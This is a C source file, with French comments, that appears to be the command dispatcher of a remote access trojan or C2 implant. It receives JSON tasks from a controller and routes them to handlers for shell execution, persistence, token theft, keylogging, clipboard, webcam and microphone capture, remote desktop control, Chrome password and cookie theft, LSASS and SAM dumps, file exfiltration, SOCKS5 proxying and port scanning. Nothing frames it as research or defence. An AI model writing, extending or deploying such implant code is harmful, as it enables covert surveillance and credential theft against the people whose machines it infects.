/*
 * dispatcher.c - Implémentation du dispatcher de commandes
 */

#include "dispatcher.h"
#include "../core/config.h"
#include "../core/demon.h"
#include "../utils/memory.h"
#include "../utils/strings.h"
#include "handlers/file.h"
#include "handlers/persist.h"
#include "handlers/process.h"
#include "handlers/recon.h"
#include "handlers/shell.h"
#include "handlers/token.h"
#include "../../include/surveillance/screenshot.h"
#include "../../include/surveillance/keylogger.h"
#include "../../include/surveillance/clipboard.h"
#include "../../include/surveillance/webcam.h"
#include "../../include/surveillance/microphone.h"
#include "../../include/remote/desktop.h"
#include "../../include/credentials/browser.h"
#include "../../include/credentials/lsass.h"
#include "../../include/exfil/exfil.h"
#include "../../include/network/socks5.h"
#include "../../include/network/portfwd.h"
#include "../../include/recon/scanner.h"

/* ============================================================================
 * Parser JSON minimal
 *
 * Note: C'est un parser très basique, juste assez pour nos besoins.
 * Dans un vrai projet on utiliserait une lib JSON.
 * ============================================================================
 */

/*
 * Trouve la valeur d'une clé dans un objet JSON simple.
 * Retourne un pointeur vers le début de la valeur (sans les quotes si string).
 */
static const char *json_find_value(const char *json, const char *key,
                                   size_t *value_len) {
  if (!json || !key)
    return NULL;

  char search_key[128];
  snprintf(search_key, sizeof(search_key), "\"%s\":", key);

  const char *found = strstr(json, search_key);
  if (!found)
    return NULL;

  /* Avance après le : */
  found += strlen(search_key);

  /* Skip les whitespaces */
  while (*found == ' ' || *found == '\t' || *found == '\n')
    found++;

  /* Détermine le type de valeur */
  if (*found == '"') {
    /* C'est une string */
    found++;
    const char *end = strchr(found, '"');
    if (!end)
      return NULL;
    *value_len = end - found;
    return found;
  } else if (*found == '{' || *found == '[') {
    /* Objet ou array - pas supporté pour l'instant */
    *value_len = 0;
    return NULL;
  } else {
    /* Nombre ou bool */
    const char *end = found;
    while (*end && *end != ',' && *end != '}' && *end != ' ' && *end != '\n') {
      end++;
    }
    *value_len = end - found;
    return found;
  }
}

/*
 * Extrait une string d'un JSON.
 * Le résultat doit être libéré par l'appelant.
 */
static char *json_get_string(const char *json, const char *key) {
  size_t len = 0;
  const char *value = json_find_value(json, key, &len);
  if (!value || len == 0)
    return NULL;

  char *result = (char *)malloc(len + 1);
  if (!result)
    return NULL;

  memcpy(result, value, len);
  result[len] = '\0';

  return result;
}

/*
 * Extrait un int d'un JSON.
 */
static int json_get_int(const char *json, const char *key) {
  size_t len = 0;
  const char *value = json_find_value(json, key, &len);
  if (!value || len == 0)
    return 0;

  return str_to_int(value);
}

/*
 * Convertit un string de commande en enum.
 */
static command_type_t string_to_command(const char *cmd) {
  if (!cmd)
    return CMD_NONE;

  if (str_icmp(cmd, "shell") == 0)
    return CMD_SHELL;
  if (str_icmp(cmd, "pwd") == 0)
    return CMD_PWD;
  if (str_icmp(cmd, "cd") == 0)
    return CMD_CD;
  if (str_icmp(cmd, "ls") == 0)
    return CMD_LS;
  if (str_icmp(cmd, "dir") == 0)
    return CMD_LS;
  if (str_icmp(cmd, "download") == 0)
    return CMD_DOWNLOAD;
  if (str_icmp(cmd, "upload") == 0)
    return CMD_UPLOAD;
  if (str_icmp(cmd, "ps") == 0)
    return CMD_PS;
  if (str_icmp(cmd, "kill") == 0)
    return CMD_KILL;
  if (str_icmp(cmd, "whoami") == 0)
    return CMD_WHOAMI;
  if (str_icmp(cmd, "sysinfo") == 0)
    return CMD_SYSINFO;
  if (str_icmp(cmd, "sleep") == 0)
    return CMD_SLEEP;
  if (str_icmp(cmd, "exit") == 0)
    return CMD_EXIT;
  if (str_icmp(cmd, "persist") == 0)
    return CMD_PERSIST;
  if (str_icmp(cmd, "token_list") == 0)
    return CMD_TOKEN_LIST;
  if (str_icmp(cmd, "token_steal") == 0)
    return CMD_TOKEN_STEAL;
  if (str_icmp(cmd, "screenshot") == 0)
    return CMD_SCREENSHOT;
  if (str_icmp(cmd, "keylog_start") == 0)
    return CMD_KEYLOG_START;
  if (str_icmp(cmd, "keylog_stop") == 0)
    return CMD_KEYLOG_STOP;
  if (str_icmp(cmd, "keylog_dump") == 0)
    return CMD_KEYLOG_DUMP;
  if (str_icmp(cmd, "clipboard_start") == 0)
    return CMD_CLIPBOARD_START;
  if (str_icmp(cmd, "clipboard_stop") == 0)
    return CMD_CLIPBOARD_STOP;
  if (str_icmp(cmd, "clipboard_dump") == 0)
    return CMD_CLIPBOARD_DUMP;
  if (str_icmp(cmd, "webcam_snap") == 0)
    return CMD_WEBCAM_SNAP;
  if (str_icmp(cmd, "mic_record") == 0)
    return CMD_MIC_RECORD;
  if (str_icmp(cmd, "desktop_capture") == 0)
    return CMD_DESKTOP_CAPTURE;
  if (str_icmp(cmd, "desktop_mouse") == 0)
    return CMD_DESKTOP_MOUSE;
  if (str_icmp(cmd, "desktop_key") == 0)
    return CMD_DESKTOP_KEY;
  if (str_icmp(cmd, "browser_creds") == 0)
    return CMD_BROWSER_CREDS;
  if (str_icmp(cmd, "browser_cookies") == 0)
    return CMD_BROWSER_COOKIES;
  if (str_icmp(cmd, "lsass_dump") == 0)
    return CMD_LSASS_DUMP;
  if (str_icmp(cmd, "sam_dump") == 0)
    return CMD_SAM_DUMP;
  if (str_icmp(cmd, "system_dump") == 0)
    return CMD_SYSTEM_DUMP;
  if (str_icmp(cmd, "reg_creds") == 0)
    return CMD_REG_CREDS;
  if (str_icmp(cmd, "exfil_search") == 0)
    return CMD_EXFIL_SEARCH;
  if (str_icmp(cmd, "exfil_read") == 0)
    return CMD_EXFIL_READ;
  if (str_icmp(cmd, "socks5_start") == 0)
    return CMD_SOCKS5_START;
  if (str_icmp(cmd, "socks5_stop") == 0)
    return CMD_SOCKS5_STOP;
  if (str_icmp(cmd, "portfwd_add") == 0)
    return CMD_PORTFWD_ADD;
  if (str_icmp(cmd, "portfwd_remove") == 0)
    return CMD_PORTFWD_REMOVE;
  if (str_icmp(cmd, "portfwd_list") == 0)
    return CMD_PORTFWD_LIST;
  if (str_icmp(cmd, "scan_ports") == 0)
    return CMD_SCAN_PORTS;
  if (str_icmp(cmd, "scan_range") == 0)
    return CMD_SCAN_RANGE;
  if (str_icmp(cmd, "scan_host") == 0)
    return CMD_SCAN_HOST;

  return CMD_NONE;
}

/* ============================================================================
 * Implémentation
 * ============================================================================
 */

int dispatcher_init(void) {
  /* Pour l'instant rien à initialiser */
  return STATUS_SUCCESS;
}

int dispatcher_parse_tasks(const char *json_data, size_t data_len,
                           task_t **tasks, int *task_count) {
  if (!json_data || !tasks || !task_count) {
    return STATUS_FAILURE;
  }

  *tasks = NULL;
  *task_count = 0;

  UNUSED(data_len);

  /*
   * Format attendu:
   * {
   *   "tasks": [
   *     {"task_id": "xxx", "command": "shell", "args": "whoami"},
   *     ...
   *   ]
   * }
   *
   * Ou format simple pour une seule tâche:
   * {"task_id": "xxx", "command": "shell", "args": "whoami"}
   */

  /* Check si c'est une réponse vide */
  if (strstr(json_data, "\"tasks\":[]") || strstr(json_data, "\"tasks\": []")) {
    return STATUS_SUCCESS; /* Pas de tâches */
  }

  /* Parse une seule tâche pour l'instant */
  char *task_id = json_get_string(json_data, "task_id");
  char *command = json_get_string(json_data, "command");
  char *args = json_get_string(json_data, "args");

  if (!task_id || !command) {
    if (task_id)
      free(task_id);
    if (command)
      free(command);
    if (args)
      free(args);
    return STATUS_SUCCESS; /* Pas de tâche valide */
  }

  /* Alloue une tâche */
  task_t *task = (task_t *)secure_alloc(sizeof(task_t));
  if (!task) {
    free(task_id);
    free(command);
    if (args)
      free(args);
    return STATUS_NO_MEMORY;
  }

  strncpy(task->task_id, task_id, sizeof(task->task_id) - 1);
  task->command = string_to_command(command);
  task->args = args;
  task->args_len = args ? strlen(args) : 0;
  task->data = NULL;
  task->data_len = 0;

  free(task_id);
  free(command);

  *tasks = task;
  *task_count = 1;

  return STATUS_SUCCESS;
}

int dispatcher_execute(task_t *task, task_result_t *result) {
  if (!task || !result) {
    return STATUS_FAILURE;
  }

  memset(result, 0, sizeof(task_result_t));
  strncpy(result->task_id, task->task_id, sizeof(result->task_id) - 1);

  int status = STATUS_SUCCESS;

  switch (task->command) {
  case CMD_SHELL:
    status =
        handler_shell_exec(task->args, &result->output, &result->output_len);
    break;

  case CMD_PWD:
    status = handler_file_pwd(&result->output, &result->output_len);
    break;

  case CMD_CD:
    status = handler_file_cd(task->args, &result->output, &result->output_len);
    break;

  case CMD_LS:
    status = handler_file_ls(task->args, &result->output, &result->output_len);
    break;

  case CMD_DOWNLOAD:
    status =
        handler_file_download(task->args, &result->data, &result->data_len);
    if (status == STATUS_SUCCESS) {
      result->output = str_dup("File downloaded successfully");
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_UPLOAD:
    /* L'upload nécessite les données dans task->data */
    status = handler_file_upload(task->args, task->data, task->data_len);
    result->output = str_dup(status == STATUS_SUCCESS ? "Upload successful"
                                                      : "Upload failed");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_PS:
    status = handler_process_list(&result->output, &result->output_len);
    break;

  case CMD_KILL:
    status = handler_process_kill(str_to_int(task->args));
    result->output = str_dup(
        status == STATUS_SUCCESS ? "Process killed" : "Failed to kill process");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_WHOAMI:
    status = handler_recon_whoami(&result->output, &result->output_len);
    break;

  case CMD_SYSINFO:
    status = handler_recon_sysinfo(&result->output, &result->output_len);
    break;

  case CMD_SLEEP: {
    DWORD new_sleep =
        (DWORD)str_to_int(task->args) * 1000; /* Convertit en ms */
    /* Applique le nouveau sleep time via la config globale */
    config_set_sleep(&g_demon.config, new_sleep);
    char msg[64];
    snprintf(msg, sizeof(msg), "Sleep time updated to %lu seconds",
             (unsigned long)(new_sleep / 1000));
    result->output = str_dup(msg);
    result->output_len = result->output ? strlen(result->output) : 0;
  } break;

  case CMD_EXIT:
    /* Signale au demon de s'arrêter */
    result->output = str_dup("Exiting...");
    result->output_len = result->output ? strlen(result->output) : 0;
    /* Le flag running sera mis à false par le demon */
    break;

  case CMD_PERSIST:
    status = handler_persist_add(task->args);
    result->output =
        str_dup(status == STATUS_SUCCESS ? "Persistence added"
                                         : "Failed to add persistence");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_TOKEN_LIST:
    status = handler_token_list(&result->output, &result->output_len);
    break;

  case CMD_TOKEN_STEAL:
    status = handler_token_steal(str_to_int(task->args));
    result->output = str_dup(
        status == STATUS_SUCCESS ? "Token stolen" : "Failed to steal token");
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_SCREENSHOT:
    {
      BYTE* png_data = NULL;
      DWORD png_size = 0;
      if (Screenshot_Capture(&png_data, &png_size)) {
        result->data = png_data;
        result->data_len = png_size;
        result->output = str_dup("Screenshot captured");
        status = STATUS_SUCCESS;
      } else {
         result->output = str_dup("Screenshot failed");
         status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_KEYLOG_START:
    if (Keylogger_IsRunning()) {
      result->output = str_dup("Keylogger already running");
      status = STATUS_SUCCESS;
    } else if (Keylogger_Start()) {
      result->output = str_dup("Keylogger started");
      status = STATUS_SUCCESS;
    } else {
      result->output = str_dup("Failed to start keylogger");
      status = STATUS_FAILURE;
    }
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_KEYLOG_STOP:
    Keylogger_Stop();
    result->output = str_dup("Keylogger stopped");
    result->output_len = result->output ? strlen(result->output) : 0;
    status = STATUS_SUCCESS;
    break;

  case CMD_KEYLOG_DUMP:
    {
      char* keylog_data = NULL;
      DWORD keylog_size = 0;
      if (Keylogger_GetBuffer(&keylog_data, &keylog_size)) {
        if (keylog_data && keylog_size > 0) {
          result->output = keylog_data;  // Transfer ownership
          result->output_len = keylog_size;
        } else {
          result->output = str_dup("No keystrokes captured");
          result->output_len = result->output ? strlen(result->output) : 0;
        }
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to get keylog buffer");
        result->output_len = result->output ? strlen(result->output) : 0;
        status = STATUS_FAILURE;
      }
    }

    break;

  case CMD_CLIPBOARD_START:
    if (Clipboard_IsRunning()) {
      result->output = str_dup("Clipboard monitor already running");
      status = STATUS_SUCCESS;
    } else if (Clipboard_Start()) {
      result->output = str_dup("Clipboard monitor started");
      status = STATUS_SUCCESS;
    } else {
      result->output = str_dup("Failed to start clipboard monitor");
      status = STATUS_FAILURE;
    }
    result->output_len = result->output ? strlen(result->output) : 0;
    break;

  case CMD_CLIPBOARD_STOP:
    Clipboard_Stop();
    result->output = str_dup("Clipboard monitor stopped");
    result->output_len = result->output ? strlen(result->output) : 0;
    status = STATUS_SUCCESS;
    break;

  case CMD_CLIPBOARD_DUMP:
    {
      char* clip_data = NULL;
      DWORD clip_size = 0;
      if (Clipboard_GetBuffer(&clip_data, &clip_size)) {
        if (clip_data && clip_size > 0) {
          result->output = clip_data; // Transfer ownership
          result->output_len = clip_size;
        } else {
          result->output = str_dup("No clipboard data captured");
          result->output_len = result->output ? strlen(result->output) : 0;
        }
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to get clipboard buffer");
        result->output_len = result->output ? strlen(result->output) : 0;
        status = STATUS_FAILURE;
      }
    }
    break;

  case CMD_WEBCAM_SNAP:
    {
      BYTE* webcam_data = NULL;
      DWORD webcam_size = 0;
      if (Webcam_CaptureSnapshot(&webcam_data, &webcam_size)) {
        result->data = webcam_data;
        result->data_len = webcam_size;
        result->output = str_dup("Webcam snapshot captured");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to capture webcam (no camera?)");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_MIC_RECORD:
    {
      int seconds = 5; // Défaut
      if (task->args && strlen(task->args) > 0) {
          seconds = str_to_int(task->args);
      }
      if (seconds <= 0) seconds = 5;

      BYTE* audio_data = NULL;
      DWORD audio_size = 0;
      audio_data = Microphone_Record(seconds, &audio_size);
      
      if (audio_data && audio_size > 0) {
        result->data = audio_data;
        result->data_len = audio_size;
        result->output = str_dup("Audio recording captured");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to record audio (no mic or error)");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_DESKTOP_CAPTURE:
    {
      int quality = 50; // Défaut
      if (task->args && strlen(task->args) > 0) {
        quality = str_to_int(task->args);
        if (quality <= 0 || quality > 100) quality = 50;
      }
      BYTE* frame_data = NULL;
      DWORD frame_size = 0;
      if (Desktop_CaptureScreen(&frame_data, &frame_size, quality)) {
        result->data = frame_data;
        result->data_len = frame_size;
        result->output = str_dup("Desktop frame captured");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to capture desktop");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_DESKTOP_MOUSE:
    {
      // Format args: "x,y,flags"
      int x = 0, y = 0;
      DWORD flags = 0;
      if (task->args) {
        sscanf(task->args, "%d,%d,%lu", &x, &y, &flags);
      }
      if (Desktop_InjectMouse(x, y, flags)) {
        result->output = str_dup("Mouse event injected");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to inject mouse event");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_DESKTOP_KEY:
    {
      // Format args: "vk,up" (vk = virtual key code, up = 0 or 1)
      WORD vk = 0;
      int up = 0;
      if (task->args) {
        sscanf(task->args, "%hu,%d", &vk, &up);
      }
      if (Desktop_InjectKey(vk, up != 0)) {
        result->output = str_dup("Key event injected");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to inject key event");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_BROWSER_CREDS:
    {
      char* creds_json = NULL;
      if (Browser_GetChromePasswords(&creds_json)) {
        result->output = creds_json;
        result->output_len = creds_json ? strlen(creds_json) : 0;
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to extract browser credentials");
        result->output_len = result->output ? strlen(result->output) : 0;
        status = STATUS_FAILURE;
      }
    }
    break;

  case CMD_BROWSER_COOKIES:
    {
      char* cookies_json = NULL;
      if (Browser_GetChromeCookies(&cookies_json)) {
        result->output = cookies_json;
        result->output_len = cookies_json ? strlen(cookies_json) : 0;
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to extract browser cookies");
        result->output_len = result->output ? strlen(result->output) : 0;
        status = STATUS_FAILURE;
      }
    }
    break;

  case CMD_LSASS_DUMP:
    {
      BYTE* dump_data = NULL;
      DWORD dump_size = 0;
      if (Lsass_Dump(&dump_data, &dump_size)) {
        result->data = dump_data;
        result->data_len = dump_size;
        result->output = str_dup("LSASS dump successful");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("LSASS dump failed (need admin privileges)");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_SAM_DUMP:
    {
      BYTE* sam_data = NULL;
      DWORD sam_size = 0;
      if (Registry_DumpSAM(&sam_data, &sam_size)) {
        result->data = sam_data;
        result->data_len = sam_size;
        result->output = str_dup("SAM dump successful");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("SAM dump failed (need admin privileges)");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_SYSTEM_DUMP:
    {
      BYTE* sys_data = NULL;
      DWORD sys_size = 0;
      if (Registry_DumpSYSTEM(&sys_data, &sys_size)) {
        result->data = sys_data;
        result->data_len = sys_size;
        result->output = str_dup("SYSTEM dump successful");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("SYSTEM dump failed (need admin privileges)");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_REG_CREDS:
    {
      char* creds_json = NULL;
      if (Registry_GetStoredCredentials(&creds_json)) {
        result->output = creds_json;
        result->output_len = creds_json ? strlen(creds_json) : 0;
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to extract registry credentials");
        result->output_len = result->output ? strlen(result->output) : 0;
        status = STATUS_FAILURE;
      }
    }
    break;

  case CMD_EXFIL_SEARCH:
    {
      // Format args: "path,byExt,byKey,depth" (ex: "C:\\Users,1,1,5")
      char path[MAX_PATH] = {0};
      int byExt = 1, byKey = 1, depth = 5;
      if (task->args) {
        sscanf(task->args, "%259[^,],%d,%d,%d", path, &byExt, &byKey, &depth);
      }
      char* result_json = NULL;
      if (Exfil_SearchFiles(path[0] ? path : NULL, byExt != 0, byKey != 0, depth, &result_json)) {
        result->output = result_json;
        result->output_len = result_json ? strlen(result_json) : 0;
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("File search failed");
        result->output_len = result->output ? strlen(result->output) : 0;
        status = STATUS_FAILURE;
      }
    }
    break;

  case CMD_EXFIL_READ:
    {
      // args = chemin du fichier
      if (task->args && strlen(task->args) > 0) {
        BYTE* file_data = NULL;
        DWORD file_size = 0;
        if (Exfil_ReadFile(task->args, &file_data, &file_size)) {
          result->data = file_data;
          result->data_len = file_size;
          result->output = str_dup("File read successful");
          status = STATUS_SUCCESS;
        } else {
          result->output = str_dup("Failed to read file");
          status = STATUS_FAILURE;
        }
      } else {
        result->output = str_dup("No file path provided");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_SOCKS5_START:
    {
      USHORT port = 0; // 0 = choix automatique
      if (task->args && strlen(task->args) > 0) {
        port = (USHORT)atoi(task->args);
      }
      USHORT actualPort = Socks5_Start(port);
      if (actualPort > 0) {
        char msg[64];
        snprintf(msg, sizeof(msg), "SOCKS5 proxy started on port %u", actualPort);
        result->output = str_dup(msg);
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to start SOCKS5 proxy");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_SOCKS5_STOP:
    {
      if (Socks5_IsRunning()) {
        Socks5_Stop();
        result->output = str_dup("SOCKS5 proxy stopped");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("SOCKS5 proxy not running");
        status = STATUS_SUCCESS;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;



  case CMD_PORTFWD_ADD:
    {
      // Format: "localPort,destHost,destPort" (localPort 0 = auto)
      int localPort = 0;
      char destHost[256] = {0};
      int destPort = 0;
      
      if (task->args) {
        sscanf(task->args, "%d,%255[^,],%d", &localPort, destHost, &destPort);
      }
      
      int fwdId = PortFwd_Create((USHORT)localPort, destHost, (USHORT)destPort);
      if (fwdId > 0) {
        char msg[128];
        snprintf(msg, sizeof(msg), "Port forward created (ID: %d)", fwdId);
        result->output = str_dup(msg);
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to create port forward");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_PORTFWD_REMOVE:
    {
      int id = 0;
      if (task->args) id = atoi(task->args);
      
      if (PortFwd_Remove(id)) {
        result->output = str_dup("Port forward removed");
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to remove port forward (not found?)");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_PORTFWD_LIST:
    {
      char* json = NULL;
      if (PortFwd_List(&json)) {
        result->output = json;
        result->output_len = json ? strlen(json) : 0;
        status = STATUS_SUCCESS;
      } else {
        result->output = str_dup("Failed to list port forwards");
        result->output_len = result->output ? strlen(result->output) : 0;
        status = STATUS_FAILURE;
      }
    }
    break;

  case CMD_SCAN_PORTS:
    {
      // args = target (IP ou hostname)
      if (task->args && strlen(task->args) > 0) {
        char* scan_json = NULL;
        if (Scanner_ScanPorts(task->args, &scan_json)) {
          result->output = scan_json;
          result->output_len = scan_json ? strlen(scan_json) : 0;
          status = STATUS_SUCCESS;
        } else {
          result->output = str_dup("Port scan failed");
          status = STATUS_FAILURE;
        }
      } else {
        result->output = str_dup("No target specified");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_SCAN_RANGE:
    {
      // args = "target,startPort,endPort"
      char target[256] = {0};
      int startPort = 1, endPort = 1024;
      if (task->args) {
        sscanf(task->args, "%255[^,],%d,%d", target, &startPort, &endPort);
      }
      if (target[0]) {
        char* scan_json = NULL;
        if (Scanner_ScanRange(target, (USHORT)startPort, (USHORT)endPort, &scan_json)) {
          result->output = scan_json;
          result->output_len = scan_json ? strlen(scan_json) : 0;
          status = STATUS_SUCCESS;
        } else {
          result->output = str_dup("Range scan failed");
          status = STATUS_FAILURE;
        }
      } else {
        result->output = str_dup("No target specified");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  case CMD_SCAN_HOST:
    {
      // args = target
      if (task->args && strlen(task->args) > 0) {
        BOOL isUp = FALSE;
        if (Scanner_IsHostUp(task->args, &isUp)) {
          result->output = str_dup(isUp ? "Host is UP" : "Host is DOWN");
          status = STATUS_SUCCESS;
        } else {
          result->output = str_dup("Host check failed");
          status = STATUS_FAILURE;
        }
      } else {
        result->output = str_dup("No target specified");
        status = STATUS_FAILURE;
      }
      result->output_len = result->output ? strlen(result->output) : 0;
    }
    break;

  default:
    result->output = str_dup("Unknown command");
    result->output_len = result->output ? strlen(result->output) : 0;
    status = STATUS_TASK_ERROR;
    break;
  }

  result->status = status;

  return status;
}

void dispatcher_cleanup(void) { /* Rien à cleanup pour l'instant */ }
